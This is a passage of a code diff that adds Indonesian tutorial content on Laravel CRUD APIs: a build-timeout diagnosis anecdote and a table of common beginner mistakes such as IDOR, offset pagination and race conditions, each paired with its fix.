+        nyata: pustaka yang mencoba ulang otomatis saat jaringan gagal akan
+        melaporkan kegagalan padahal penghapusannya berhasil.
+        `,
+      ),
+      p(
+        'Terakhir, satu kelas kegagalan yang hanya muncul di produksi dan sudah ditemui sendiri saat menyusun materi ini, yaitu **kegagalan yang penyebabnya bukan kode**.',
+      ),
+      code(
+        'text',
+        `
+        Saat menyusun bab ini, build project ini sendiri gagal:
+
+          Failed to build /kelas/... (attempt 1 of 3) because it took more
+          than 60 seconds. Retrying again shortly.
+
+        Dugaan pertama: isinya terlalu berat. Diukur, dan SALAH —
+        seluruh highlighting 427 halaman memakan 5.785 ms, dan halaman
+        yang timeout 60 DETIK hanya butuh 30 MILIDETIK.
+
+        Penyebab sebenarnya: 3 proses build berebut ~1,1 GB memori tersisa
+        di mesin tanpa swap. Dengan 1 proses: 506 halaman dalam 15,9 detik.
+
+        Pelajarannya: sebelum memperbaiki kode, ukur dulu apakah kodenya
+        yang bersalah.
+        `,
+        {
+          caption: 'Ditelusuri sungguhan saat menyusun bab ini, memakai disiplin diagnose project.',
+        },
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'CRUD adalah pekerjaan yang paling sering dinyatakan selesai terlalu cepat, sebab jalur suksesnya memang cepat selesai dan terlihat meyakinkan.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Menyatakan selesai setelah jalur sukses berjalan',
+            'Fiturnya sudah bekerja',
+            'Jalur 400, 401, 404, 409, dan 422 justru yang paling sering rusak di produksi',
+          ],
+          [
+            'Memakai route model binding tanpa membatasi pemilik',
+            '404-nya sudah otomatis',
+            'Laravel memeriksa keberadaan, bukan kewenangan. Itu IDOR — batasi di query',
+          ],
+          [
+            'Memakai `paginate()` untuk daftar yang bisa sangat panjang',
+            'Itu cara paginasi yang biasa',
+            'Diukur, `OFFSET 250000` membaca 250.020 baris untuk memberi 20. Pakai `cursorPaginate`',
+          ],
+          [
+            'Mengurutkan hanya dengan `created_at`',
+            'Itu urutan yang diinginkan',
+            'Waktu bisa sama persis pada impor massal, dan diuji sungguhan, satu baris jadi tidak pernah muncul',
+          ],
+          [
+            'Mengurangi stok dengan membaca lalu menyimpan',
+            'Lebih mudah dibaca',
+            'Diukur, dua proses bersamaan membuat satu pengurangan hilang. Pakai `decrement` dengan syarat',
+          ],
+          [
+            'Menguji API tanpa header `Accept: application/json`',
+            'Endpointnya kan API',
+            'Laravel menjawab 302 alih-alih 422, dan itu terlihat seperti "endpoint tidak merespons"',
+          ],
+        ],
+      ),
+      p(
+        'Baris pertama pantas menjadi penutup kategori ini. Sebuah endpoint dinyatakan selesai bukan ketika ia mengembalikan data yang benar, melainkan ketika setiap jalur kegagalannya sudah dijalankan sekali dan menghasilkan status serta pesan yang memang dirancang. Berkas `uji-crud.sh` di atas menutup seluruhnya dalam beberapa detik, dan ia tetap berguna berbulan-bulan kemudian ketika seseorang mengubah sesuatu dan ingin tahu apakah ada yang rusak.',
+      ),
       references(
         {
           label: 'Laravel Sanctum',
